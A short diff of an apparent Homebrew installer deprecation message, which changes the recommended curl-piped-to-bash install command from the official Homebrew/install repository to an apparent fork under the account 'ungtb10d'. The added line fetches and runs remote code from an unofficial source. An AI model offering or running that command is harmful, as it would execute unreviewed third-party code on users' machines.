@@ -3,6 +3,6 @@
 abort <<EOS
 Error: The Ruby Homebrew installer is now disabled and has been rewritten in
 Bash. Please migrate to the following command:
-  /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+  /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/ungtb10d/install/HEAD/install.sh)"
 
 EOS
